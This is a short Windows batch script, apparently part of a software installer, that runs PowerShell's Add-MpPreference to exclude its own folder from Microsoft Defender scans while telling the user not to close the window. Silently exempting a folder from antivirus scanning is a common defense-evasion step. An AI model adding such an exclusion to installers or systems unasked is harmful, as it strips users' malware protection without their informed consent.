@echo off
%~d0
CD %~dp0
set mypath=%cd%
echo ---------------------------------------------
echo PLEASE DO NOT CLOSE THE WINDOW!
echo ---------------------------------------------
echo Adding installation path to exclude from Microsoft Defender Antivirus scans. Please wait...
start powershell -Command "Add-MpPreference -ExclusionPath '%mypath%'" 

:END
echo ---------------------------------------------
timeout 3
exit